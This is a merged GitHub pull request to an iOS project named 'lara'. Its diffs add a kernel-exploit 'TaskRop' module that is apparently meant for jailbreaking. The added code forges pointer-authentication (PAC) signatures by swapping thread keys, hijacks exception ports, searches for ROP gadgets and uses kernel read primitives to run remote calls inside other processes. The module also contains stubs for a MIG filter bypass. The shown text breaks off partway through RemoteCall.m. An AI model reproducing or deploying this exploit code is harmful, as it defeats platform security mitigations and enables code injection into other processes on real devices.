# something something add remotecall ok I hate you

> **Repository:** [rooootdev/lara](https://github.com/rooootdev/lara)  
> **Pull Request:** [#96](https://github.com/rooootdev/lara/pull/96)  
> **State:** 🟣 merged  
> **Branch:** `Baconium:main` → `rooootdev:main`  
> **Merged by:** [@rooootdev](https://github.com/rooootdev) on Apr 14, 2026  
> **Changes:** +2107 / -34 across 23 files  
> **Created:** Apr 14, 2026  
> **Updated:** Apr 14, 2026  
> **Closed:** Apr 14, 2026  

---

## Description

*Opened by [@Baconium](https://github.com/Baconium)* *on Apr 14, 2026*


this can't auto merge but I'm FAR too lazy to fix it myself so have fun (also I didn't add a jit enabler)


---

## Checks & Status

- Overall: 🟡 **pending**

### Check Runs (1)

- ✅ [build](https://github.com/rooootdev/lara/actions/runs/24417021302/job/71328888507) — **success** — *GitHub Actions*


---

## PR Commits (5)

- [`02d732b`](https://github.com/rooootdev/lara/commit/02d732be5eab96fd3a1ca774397944a9d005143b) something something add remotecall ok I hate you — *BaconMania* · Apr 14, 2026
- [`01bcd01`](https://github.com/rooootdev/lara/commit/01bcd0179ae467561ca86b5590e7c8454980a111) epic gitignore fail — *BaconMania* · Apr 14, 2026
- [`d0c5166`](https://github.com/rooootdev/lara/commit/d0c5166b4133910e285683dda1a7fc939b46b9a3) remove ds store — *BaconMania* · Apr 14, 2026
- [`aea73ad`](https://github.com/rooootdev/lara/commit/aea73ad02420a5952e27a13a419bcf204b0e879f) Merge upstream/main into main — *BaconMania* · Apr 14, 2026
- [`171d765`](https://github.com/rooootdev/lara/commit/171d7652396274dd250df70b3fe98b9b80e22760) ci: use build_ipa.sh in workflow — *BaconMania* · Apr 14, 2026


---

## Changed Files (23)

- 🟡 `.github/workflows/build.yml` (modified) — +5 / -23
  <details><summary>Diff</summary>

  ```diff
  @@ -25,35 +25,17 @@ jobs:
 
       - name: build
         run: |
-          xcodebuild \
-            -project lara.xcodeproj \
-            -scheme lara \
-            -configuration Debug \
-            -sdk iphoneos \
-            CODE_SIGNING_ALLOWED=NO \
-            CODE_SIGNING_REQUIRED=NO \
-            CODE_SIGN_IDENTITY="" \
-            archive \
-            -archivePath $PWD/build/lara.xcarchive | tee build.log
-      
-          APP_PATH="$PWD/build/lara.xcarchive/Products/Applications/lara.app"
-          if [ ! -d "$APP_PATH" ]; then
-            echo "Missing app at $APP_PATH"
-            exit 1
-          fi
-          rm -rf "$PWD/build/Payload"
-          mkdir -p "$PWD/build/Payload"
-          cp -R "$APP_PATH" "$PWD/build/Payload/"
-          (cd "$PWD/build" && /usr/bin/zip -qry lara.ipa Payload)
+          chmod +x scripts/build_ipa.sh
+          LARA_LDID_SIGN=0 ./scripts/build_ipa.sh
 
       - name: upload build artifact
         if: github.event_name == 'pull_request'
         uses: actions/upload-artifact@v4
         with:
           name: lara-ipa
           path: |
-            build/lara.ipa
-            build.log
+            dist/lara.ipa
+            build/xcodebuild.log
 
       - name: create release tag
         if: github.event_name != 'pull_request'
@@ -102,6 +84,6 @@ jobs:
           tag_name: latest
           name: Latest Build
           body: ${{ env.COMMITS }}
-          files: build/lara.ipa
+          files: dist/lara.ipa
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  ```

  </details>
- 🟡 `lara.xcodeproj/project.pbxproj` (modified) — +4 / -4
  <details><summary>Diff</summary>

  ```diff
  @@ -226,7 +226,7 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
-				ARCHS = arm64;
+				ARCHS = arm64e;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -291,7 +291,7 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
-				ARCHS = arm64;
+				ARCHS = arm64e;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -348,7 +348,7 @@
 		CC1C8B452F71DF9C00206982 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				ARCHS = arm64;
+				ARCHS = arm64e;
 				ASSETCATALOG_COMPILER_APPICON_NAME = lara;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
@@ -395,7 +395,7 @@
 		CC1C8B462F71DF9C00206982 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				ARCHS = arm64;
+				ARCHS = arm64e;
 				ASSETCATALOG_COMPILER_APPICON_NAME = lara;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
  ```

  </details>
- 🟡 `lara/classes/laramgr.swift` (modified) — +71 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -433,4 +433,75 @@ final class laramgr: ObservableObject {
         print("changed owner of \(path) to \(uid):\(gid)!")
         return true
     }
+    
+    // MARK: - RemoteCall
+    
+    /// Initialize remote call on a target process
+    /// - Parameters:
+    ///   - process: The process name to target
+    ///   - useMigBypass: Whether to use MIG filter bypass (not yet implemented)
+    ///   - completion: Completion handler with success status
+    func initRemoteCall(process: String, useMigBypass: Bool = false, completion: ((Bool) -> Void)? = nil) {
+        guard dsready, !remotecallrunning else {
+            completion?(false)
+            return
+        }
+        
+        remotecallrunning = true
+        logmsg("initializing remote call on \(process)...")
+        
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
+            let result = init_remote_call(process, useMigBypass)
+            
+            DispatchQueue.main.async {
+                guard let self = self else { return }
+                let success = result == 0
+                if success {
+                    self.logmsg("remote call initialized on \(process)")
+                } else {
+                    self.logmsg("remote call init failed on \(process)")
+                    self.remotecallrunning = false
+                }
+                completion?(success)
+            }
+        }
+    }
+    
+    /// Destroy the current remote call session
+    func destroyRemoteCall() {
+        guard remotecallrunning else { return }
+        
+        logmsg("destroying remote call session...")
+        
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
+            destroy_remote_call()
+            
+            DispatchQueue.main.async {
+                self?.remotecallrunning = false
+                self?.logmsg("remote call session destroyed")
+            }
+        }
+    }
+    
+    /// Execute a remote function call
+    /// - Parameters:
+    ///   - name: The function name to call
+    ///   - args: Up to 8 arguments (x0-x7)
+    ///   - timeout: Timeout in milliseconds
+    /// - Returns: The return value from the remote call
+    func doRemoteCall(name: String, args: [UInt64] = [], timeout: Int32 = 100) -> UInt64 {
+        guard remotecallrunning else { return 0 }
+        
+        // Pad args to 8 elements
+        var paddedArgs = args
+        while paddedArgs.count < 8 {
+            paddedArgs.append(0)
+        }
+        
+        return do_remote_call_stable(
+            timeout, name,
+            paddedArgs[0], paddedArgs[1], paddedArgs[2], paddedArgs[3],
+            paddedArgs[4], paddedArgs[5], paddedArgs[6], paddedArgs[7]
+        )
+    }
 }
  ```

  </details>
- 🟢 `lara/kexploit/TaskRop/Exception.h` (added) — +42 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,42 @@
+//
+//  Exception.h
+//  lara
+//
+//  Ported from darksword-kexploit-fun
+//  Original by seo on 4/4/26.
+//
+
+#ifndef Exception_h
+#define Exception_h
+
+#import <mach/mach.h>
+#import "RemoteCall.h"
+
+// from pe_main.js
+typedef struct {
+    mach_msg_header_t       Head;
+    uint64_t                NDR;
+    uint32_t                exception;
+    uint32_t                codeCnt;
+    uint64_t                codeFirst;
+    uint64_t                codeSecond;
+    uint32_t                flavor;
+    uint32_t                old_stateCnt;
+    arm_thread_state64_internal    threadState;
+    uint64_t                padding[2];
+} ExceptionMessage;
+
+typedef struct {
+    mach_msg_header_t   Head;
+    uint64_t            NDR;
+    uint32_t            RetCode;
+    uint32_t            flavor;
+    uint32_t            new_stateCnt;
+    arm_thread_state64_internal threadState;
+} __attribute__((packed)) ExceptionReply;
+
+mach_port_t create_exception_port(void);
+bool wait_exception(mach_port_t exceptionPort, ExceptionMessage *excBuffer, int timeout, bool debug);
+void reply_with_state(ExceptionMessage *exc, arm_thread_state64_internal *state);
+
+#endif /* Exception_h */
  ```

  </details>
- 🟢 `lara/kexploit/TaskRop/Exception.m` (added) — +80 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,80 @@
+//
+//  Exception.m
+//  lara
+//
+//  Original by seo on 4/4/26.
+//
+
+#import "Exception.h"
+#import "RemoteCall.h"
+#import "PAC.h"
+#import "../offsets.h"
+#import <Foundation/Foundation.h>
+#import <mach/mach.h>
+
+// xnu-10002.81.5/osfmk/mach/port.h
+#define MPO_PROVISIONAL_ID_PROT_OPTOUT     0x8000  /* Opted out of EXCEPTION_IDENTITY_PROTECTED violation for now */
+
+// Thread state flags for PAC sanitization
+#define _EXC_FLAGS_NO_PTRAUTH        0x1
+#define _EXC_FLAGS_IB_SIGNED_LR      0x2
+#define _EXC_FLAGS_KERNEL_SIGNED_PC   0x4
+#define _EXC_FLAGS_KERNEL_SIGNED_LR   0x8
+
+// from pe_main.js
+#define EXCEPTION_MSG_SIZE              0x160
+#define EXCEPTION_REPLY_SIZE            0x13c
+
+mach_port_t create_exception_port(void)
+{
+    mach_port_options_t options = {
+        .flags = MPO_INSERT_SEND_RIGHT | MPO_PROVISIONAL_ID_PROT_OPTOUT,
+        .mpl   = { .mpl_qlimit = 0 }
+    };
+
+    mach_port_t exceptionPort = MACH_PORT_NULL;
+
+    kern_return_t kr = mach_port_construct(mach_task_self_, &options, 0, &exceptionPort);
+    if (kr != KERN_SUCCESS)
+    {
+        printf("[%s:%d] Failed to create exception port: %s (kr=%d)\n", __FUNCTION__, __LINE__, mach_error_string(kr), kr);
+        return MACH_PORT_NULL;
+    }
+
+    return exceptionPort;
+}
+
+bool wait_exception(mach_port_t exceptionPort, ExceptionMessage *excBuffer, int timeout, bool debug) {
+    kern_return_t kr = mach_msg(&excBuffer->Head, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, EXCEPTION_MSG_SIZE, exceptionPort, timeout, MACH_PORT_NULL);
+    
+    if(kr != KERN_SUCCESS) return false;
+
+    return true;
+}
+
+void reply_with_state(ExceptionMessage *exc, arm_thread_state64_internal *state)
+{
+    uint8_t replyBuf[EXCEPTION_REPLY_SIZE];
+    memset(replyBuf, 0, sizeof(replyBuf));
+    ExceptionReply *reply = (ExceptionReply *)replyBuf;
+
+    reply->Head.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
+    reply->Head.msgh_size        = EXCEPTION_REPLY_SIZE;
+    reply->Head.msgh_remote_port = exc->Head.msgh_remote_port;
+    reply->Head.msgh_local_port  = MACH_PORT_NULL;
+    reply->Head.msgh_id          = exc->Head.msgh_id + 100;
+    reply->NDR                   = exc->NDR;
+    reply->RetCode               = 0;
+    reply->flavor                = ARM_THREAD_STATE64;
+    reply->new_stateCnt          = ARM_THREAD_STATE64_COUNT;
+    memcpy(&reply->threadState, state, sizeof(arm_thread_state64_t));
+
+    kern_return_t kr = mach_msg((mach_msg_header_t *)replyBuf,
+                                MACH_SEND_MSG,
+                                EXCEPTION_REPLY_SIZE, 0,
+                                MACH_PORT_NULL,
+                                MACH_MSG_TIMEOUT_NONE,
+                                MACH_PORT_NULL);
+    if (kr != KERN_SUCCESS)
+        printf("[%s:%d] reply_with_state failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(kr));
+}
  ```

  </details>
- 🟢 `lara/kexploit/TaskRop/PAC.h` (added) — +24 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,24 @@
+//
+//  PAC.h
+//  lara
+//
+//  Ported from darksword-kexploit-fun
+//  Original by seo on 4/4/26.
+//
+
+#ifndef PAC_h
+#define PAC_h
+
+#import <stdint.h>
+#import <stdbool.h>
+#import <mach/mach.h>
+
+uint64_t native_strip(uint64_t address);
+uint64_t pacia(uint64_t ptr, uint64_t modifier);
+uint64_t ptrauth_blend_discriminator_wrapper(uint64_t diver, uint64_t discriminator);
+uint64_t ptrauth_string_discriminator_special(const char *name);
+uint64_t find_pacia_gadget(void);
+void pac_cleanup(mach_port_t pacThread, mach_port_t exceptionPort, void *stack);
+uint64_t remote_pac(uint64_t remoteThreadAddr, uint64_t address, uint64_t modifier);
+
+#endif /* PAC_h */
  ```

  </details>
- 🟢 `lara/kexploit/TaskRop/PAC.m` (added) — +233 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,233 @@
+//
+//  PAC.m
+//  lara
+//
+//  Original by seo on 4/4/26.
+//
+
+#import "PAC.h"
+#import "RemoteCall.h"
+#import "Thread.h"
+#import "Exception.h"
+#import "../krw_compat.h"
+#import "../utils.h"
+#import "../offsets.h"
+
+#import <Foundation/Foundation.h>
+#import <dlfcn.h>
+#import <pthread.h>
+#import <mach/mach.h>
+#import <ptrauth.h>
+
+// Thread state flags (from mach/arm/thread_status.h)
+#ifndef __DARWIN_ARM_THREAD_STATE64_FLAGS_NO_PTRAUTH
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_NO_PTRAUTH        0x1
+#endif
+#ifndef __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR      0x2
+#endif
+#ifndef __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC  0x4
+#endif
+#ifndef __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR  0x8
+#endif
+
+// Cached pacia gadget address (kept for reference)
+uint64_t g_RC_gadgetPacia = 0;
+
+uint64_t native_strip(uint64_t address)
+{
+    return address & 0x7fffffffffULL;
+}
+
+// Inline PACIA using raw opcode - works on arm64 when we swap jop_pid first
+// The arm64 assembler doesn't recognize 'pacia' mnemonic, so we use raw opcode
+// 0xDAC10230 = pacia x16, x17
+static uint64_t inline_pacia(uint64_t ptr, uint64_t modifier)
+{
+    uint64_t val = native_strip(ptr);
+    // We put the value in x16, modifier in x17, then execute pacia x16, x17
+    __asm__ volatile (
+        "mov x16, %[ptr]\n"
+        "mov x17, %[mod]\n"
+        ".long 0xDAC10230\n"   // pacia x16, x17
+        "mov %[out], x16\n"
+        : [out] "=r"(val)
+        : [ptr] "r"(val), [mod] "r"(modifier)
+        : "x16", "x17"
+    );
+    return val;
+}
+
+uint64_t pacia(uint64_t ptr, uint64_t modifier)
+{
+    return inline_pacia(ptr, modifier);
+}
+
+uint64_t ptrauth_blend_discriminator_wrapper(uint64_t diver, uint64_t discriminator)
+{
+    return (diver & 0xFFFFFFFFFFFFULL) | discriminator;
+}
+
+uint64_t ptrauth_string_discriminator_special(const char *name)
+{
+    if (strcmp(name, "pc") == 0) return 0x7481000000000000ULL;
+    if (strcmp(name, "lr") == 0) return 0x77d3000000000000ULL;
+    if (strcmp(name, "sp") == 0) return 0xcbed000000000000ULL;
+    if (strcmp(name, "fp") == 0) return 0x4517000000000000ULL;
+    return 0;
+}
+
+uint64_t find_pacia_gadget(void)
+{
+    const uint32_t paciaGadgetOpcodes[] = {
+        0xDAC10230,   // pacia x16, x17
+        0xAA1003E0,   // mov x0, x16
+        0xD65F03C0    // ret
+    };
+    
+    void *sym = dlsym(RTLD_DEFAULT, "$sSwySWSnySiGciM");
+    if (!sym) {
+        printf("[%s:%d] $sSwySWSnySiGciM symbol not found\n", __FUNCTION__, __LINE__);
+        return 0;
+    }
+    
+    uint64_t symAddr = native_strip((uint64_t)sym);
+    uint8_t *searchBase = (uint8_t *)(uintptr_t)symAddr;
+    
+    for (size_t offset = 0; offset + sizeof(paciaGadgetOpcodes) <= 0x1000; offset += 4) {
+        if (memcmp(searchBase + offset, paciaGadgetOpcodes, sizeof(paciaGadgetOpcodes)) == 0) {
+            printf("[%s:%d] found pacia gadget, gadget addr = 0x%llx\n", __FUNCTION__, __LINE__, symAddr + offset);
+            return symAddr + offset;
+        }
+    }
+    
+    printf("[%s:%d] couldn't find pacia gadget :(\n", __FUNCTION__, __LINE__);
+    return 0;
+}
+
+void pac_cleanup(mach_port_t pacThread, mach_port_t exceptionPort, void *stack)
+{
+    if (pacThread != MACH_PORT_NULL)
+        thread_terminate(pacThread);
+    if (exceptionPort != MACH_PORT_NULL)
+        mach_port_destruct(mach_task_self_, exceptionPort, 0, 0);
+    if (stack)
+        free(stack);
+}
+
+// ============================================================================
+// Remote PAC signing
+//
+// Creates a local thread with the remote process's PAC keys, runs the
+// PACIA gadget, catches the resulting exception, and returns the signed
+// value from x16.  Requires arm64e binary so PACIA is not a NOP.
+// ============================================================================
+
+uint64_t remote_pac(uint64_t remoteThreadAddr, uint64_t address, uint64_t modifier) {
+    if (!is_pac_supported())
+        return address;
+
+    if (!g_RC_gadgetPacia) {
+        uint64_t gadgetAddr = find_pacia_gadget();
+        if (gadgetAddr == 0) {
+            printf("[%s:%d] find_pacia_gadget failed\n", __FUNCTION__, __LINE__);
+            fflush(stdout);
+            return (uint64_t)-1;
+        }
+        g_RC_gadgetPacia = gadgetAddr;
+    }
+    printf("[%s:%d] remote_pac: addr=0x%llx mod=0x%llx gadget=0x%llx\n",
+           __FUNCTION__, __LINE__, address, modifier, g_RC_gadgetPacia);
+    fflush(stdout);
+
+    address = native_strip(address);
+
+    uint64_t keyA = thread_get_rop_pid(remoteThreadAddr);
+    uint64_t keyB = thread_get_jop_pid(remoteThreadAddr);
+
+    mach_port_t pacThread = MACH_PORT_NULL;
+    kern_return_t kr = thread_create(mach_task_self_, &pacThread);
+    if (kr != KERN_SUCCESS) {
+        printf("[%s:%d] thread_create failed, kr = %s (0x%x)\n", __FUNCTION__, __LINE__, mach_error_string(kr), kr);
+        return (uint64_t)-1;
+    }
+
+    void *stack = malloc(0x4000);
+    memset(stack, 0, 0x4000);
+    uint64_t sp = (uint64_t)(uintptr_t)stack + 0x2000;
+
+    arm_thread_state64_internal state;
+    memset(&state, 0, sizeof(state));
+    state.__sp = sp;
+    state.__pc = pacia(g_RC_gadgetPacia, ptrauth_string_discriminator("pc"));
+    state.__lr = pacia(0x401, ptrauth_string_discriminator("lr"));
+
+    state.__x[0]  = 0;
+    state.__x[1]  = address;
+    state.__x[2]  = modifier;
+    state.__x[3]  = (uint64_t)pacThread;
+    state.__x[16] = address;
+    state.__x[17] = modifier;
+
+    mach_port_t exceptionPort = create_exception_port();
+    if (!exceptionPort) {
+        printf("[%s:%d] create_exception_port failed\n", __FUNCTION__, __LINE__);
+        pac_cleanup(pacThread, MACH_PORT_NULL, stack);
+        return 0;
+    }
+
+    kr = thread_set_exception_ports(pacThread,
+                                    EXC_MASK_BAD_ACCESS,
+                                    exceptionPort,
+                                    EXCEPTION_STATE | MACH_EXCEPTION_CODES,
+                                    ARM_THREAD_STATE64);
+    if (kr != KERN_SUCCESS) {
+        printf("[%s:%d] thread_set_exception_ports failed: 0x%x (%s)\n", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
+        pac_cleanup(pacThread, exceptionPort, stack);
+        return 0;
+    }
+
+    uint64_t pacThreadAddr = task_get_ipc_port_kobject(task_self(), pacThread);
+    if (!pacThreadAddr) {
+        printf("[%s:%d] task_get_ipc_port_kobject failed\n", __FUNCTION__, __LINE__);
+        pac_cleanup(pacThread, exceptionPort, stack);
+        return 0;
+    }
+
+    if (!thread_set_state_wrapper(pacThread, pacThreadAddr, &state)) {
+        printf("[%s:%d] thread_set_state_wrapper failed\n", __FUNCTION__, __LINE__);
+        fflush(stdout);
+        pac_cleanup(pacThread, exceptionPort, stack);
+        return 0;
+    }
+    printf("[%s:%d] PAC thread state set, swapping keys and resuming\n", __FUNCTION__, __LINE__);
+    fflush(stdout);
+
+    thread_set_pac_keys(pacThreadAddr, keyA, keyB);
+
+    kr = thread_resume(pacThread);
+    if (kr != KERN_SUCCESS) {
+        printf("[%s:%d] thread_resume failed: 0x%x (%s)\n", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
+        pac_cleanup(pacThread, exceptionPort, stack);
+        return 0;
+    }
+
+    ExceptionMessage exc;
+    memset(&exc, 0, sizeof(exc));
+
+    if (!wait_exception(exceptionPort, &exc, 100, false)) {
+        printf("[%s:%d] wait_exception failed (PAC thread didn't crash?)\n", __FUNCTION__, __LINE__);
+        fflush(stdout);
+        pac_cleanup(pacThread, exceptionPort, stack);
+        return 0;
+    }
+
+    uint64_t signedAddress = exc.threadState.__x[16];
+    printf("[%s:%d] remote_pac result: 0x%llx\n", __FUNCTION__, __LINE__, signedAddress);
+    fflush(stdout);
+    pac_cleanup(pacThread, exceptionPort, stack);
+
+    return signedAddress;
+}
  ```

  </details>
- 🟢 `lara/kexploit/TaskRop/RemoteCall.h` (added) — +57 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,57 @@
+//
+//  RemoteCall.h
+//  lara
+//
+//  Ported from darksword-kexploit-fun
+//  Original by seo on 3/29/26.
+//
+
+#ifndef RemoteCall_h
+#define RemoteCall_h
+
+#import <mach/mach.h>
+#import <stdbool.h>
+#import <stdint.h>
+
+struct VMShmem {
+    uint64_t port;
+    uint64_t remoteAddress;
+    uint64_t localAddress;
+    bool     used;
+};
+
+// from Duy Tran's TaskPortHaxxApp
+// https://github.com/khanhduytran0/TaskPortHaxxApp/blob/pacbypass/TaskPortHaxxApp/Header.h#L83
+typedef struct {
+    uint64_t __x[29];       /* General purpose registers x0-x28 */
+    uint64_t __fp; /* Frame pointer x29 */
+    uint64_t __lr; /* Link register x30 */
+    uint64_t __sp; /* Stack pointer x31 */
+    uint64_t __pc; /* Program counter */
+    uint32_t __cpsr;        /* Current program status register */
+    uint32_t __flags; /* Flags describing structure format */
+} arm_thread_state64_internal;
+
+// Exception port creation
+mach_port_t create_exception_port(void);
+
+// Remote call initialization and cleanup
+int init_remote_call(const char* process, bool useMigFilterBypass);
+int destroy_remote_call(void);
+
+// Remote function execution
+uint64_t do_remote_call_stable(int timeout, const char *name,
+    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
+
+// PAC signing
+void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr);
+uint64_t remote_pac(uint64_t remoteThreadAddr, uint64_t address, uint64_t modifier);
+
+// Remote memory operations
+bool remote_read(uint64_t src, void *dst, uint64_t size);
+bool remote_write(uint64_t dst, const void *src, uint64_t size);
+bool remote_writeStr(uint64_t dst, const char *str);
+void remote_hexdump(uint64_t remoteAddr, size_t size);
+
+#endif /* RemoteCall_h */
  ```

  </details>
- 🟢 `lara/kexploit/TaskRop/RemoteCall.m` (added) — +793 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,793 @@
+//
+//  RemoteCall.m
+//  lara
+//
+
+#import <Foundation/Foundation.h>
+#import <mach/mach.h>
+#import <UIKit/UIKit.h>
+#import <dlfcn.h>
+#import <pthread.h>
+#import <stdint.h>
+#import <sys/mman.h>
+
+#import "RemoteCall.h"
+#import "VM.h"
+#import "Exception.h"
+#import "PAC.h"
+#import "Thread.h"
+#import "../krw_compat.h"
+#import "../offsets.h"
+#import "../darksword.h"
+#import "../utils.h"
+
+// xnu-10002.81.5/osfmk/kern/exc_guard.h
+#define EXC_GUARD_ENCODE_TYPE(code, type) \
+    ((code) |= (((uint64_t)(type) & 0x7ull) << 61))
+#define EXC_GUARD_ENCODE_FLAVOR(code, flavor) \
+    ((code) |= (((uint64_t)(flavor) & 0x1fffffffull) << 32))
+#define EXC_GUARD_ENCODE_TARGET(code, target) \
+    ((code) |= (((uint64_t)(target) & 0xffffffffull)))
+
+// xnu-10002.81.5/osfmk/mach/arm/_structs.h
+#define __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK 0xff000000
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_NO_PTRAUTH     0x1
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR   0x2
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8
+
+// from pe_main.js
+#define SHMEM_CACHE_SIZE                100
+#define FAKE_PC_TROJAN_CREATOR          0x101
+#define FAKE_LR_TROJAN_CREATOR          0x201
+#define FAKE_PC_TROJAN                  0x301
+#define FAKE_LR_TROJAN                  0x401
+
+// from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
+#define BREAKPOINT_ENABLE 481
+#define BREAKPOINT_DISABLE 0
+
+static bool g_mig_bypass_enabled = false;
+
+void mig_bypass_init(uint64_t kernelSlide, uint64_t migLockOff, uint64_t migSbxMsgOff, uint64_t migKernelStackLROff) {
+    printf("[%s:%d] MIG bypass init stub - not implemented yet\n", __FUNCTION__, __LINE__);
+}
+
+void mig_bypass_start(void) {
+}
+
+void mig_bypass_resume(void) {
+}
+
+void mig_bypass_pause(void) {
+}
+
+void mig_bypass_monitor_threads(uint64_t thread1, uint64_t thread2) {
+}
+
+uint64_t g_RC_taskAddr;
+bool g_RC_creatingExtraThread;
+mach_port_t g_RC_firstExceptionPort;
+mach_port_t g_RC_secondExceptionPort;
+uint64_t g_RC_firstExceptionPortAddr;
+uint64_t g_RC_secondExceptionPortAddr;
+pthread_t g_RC_dummyThread;
+mach_port_t g_RC_dummyThreadMach;
+uint64_t g_RC_dummyThreadAddr;
+uint64_t g_RC_dummyThreadTro;
+uint64_t g_RC_selfThreadAddr;
+uint32_t g_RC_selfThreadCtid;
+arm_thread_state64_internal g_RC_originalState;
+uint64_t g_RC_vmMap;
+uint64_t g_RC_callThreadAddr;
+uint64_t g_RC_trojanThreadAddr;
+int g_RC_pid;
+bool g_RC_success = true;
+
+NSMutableArray<NSNumber *> *g_RC_threadList = nil;
+uint64_t g_RC_trojanMem = 0;
+struct VMShmem g_RC_shmemCache[SHMEM_CACHE_SIZE];
+
+bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
+    bool success = false;
+    
+    void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
+    void* pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
+    
+    pthread_t pthread = NULL;
+    pthread_create_suspended_np(&pthread, NULL,
+        (void *(*)(void *))thread_set_exception_ports_addr, NULL);
+    
+    mach_port_t machThread = pthread_mach_thread_np(pthread);
+    uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);
+
+    if(useMigFilterBypass) {
+        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);
+    }
+
+    arm_thread_state64_internal state;
+    memset(&state, 0, sizeof(state));
+    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
+    thread_get_state(machThread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
+    
+    uint64_t diver = 0;
+    diver = (uint64_t)state.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
+    
+    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
+    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);
+    
+    state.__x[0] = g_RC_dummyThreadMach;
+    state.__x[1] = EXC_MASK_GUARD | EXC_MASK_BAD_ACCESS;
+    state.__x[2] = exceptionPort;
+    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
+    state.__x[4] = ARM_THREAD_STATE64;
+    
+    if(useMigFilterBypass)
+        usleep(100000);
+    
+    if (!thread_set_state_wrapper(machThread, machThreadAddr,
+                                  (arm_thread_state64_internal *)&state))
+        return false;
+    
+    if(useMigFilterBypass)
+        usleep(100000);
+    
+    thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);
+    
+    if (!thread_resume_wrapper(machThread))
+        return false;
+    
+    for (int i = 0; i < 10; i++)
+    {
+        usleep(200000);
+
+        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
+        if (!kstack) {
+            printf("[%s:%d] [iter %d] Failed to get kstack. Retry...\n", __FUNCTION__, __LINE__, i);
+            fflush(stdout);
+            continue;
+        }
+        
+        uint64_t kernelSP = kread64(kstack + off_arm_kernel_saved_state_sp);
+        if (!kernelSP) {
+            printf("[%s:%d] [iter %d] Failed to get SP. Retry...\n", __FUNCTION__, __LINE__, i);
+            fflush(stdout);
+            continue;
+        }
+        usleep(100);
+
+        printf("[%s:%d] [iter %d] kstack=0x%llx kernelSP=0x%llx\n", __FUNCTION__, __LINE__, i, kstack, kernelSP);
+        fflush(stdout);
+
+        uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
+        char dataBuff[0x1000];
+        memset(dataBuff, 0, 0x1000);
+        kreadbuf(pageBase, &dataBuff, 0x1000);
+
+        uint64_t needleVal = g_RC_dummyThreadTro;
+        void *match = memmem(dataBuff, 0x1000, &needleVal, sizeof(needleVal));
+        if (!match) {
+            printf("[%s:%d] [iter %d] Couldn't find g_RC_dummyThreadTro=0x%llx in pageBase=0x%llx\n", __FUNCTION__, __LINE__, i, needleVal, pageBase);
+            fflush(stdout);
+            continue;
+        }
+        size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
+        uint64_t found = (uint64_t)foundOffset + 0x3000;
+        printf("[%s:%d] [iter %d] Found TRO at offset=0x%llx\n", __FUNCTION__, __LINE__, i, found);
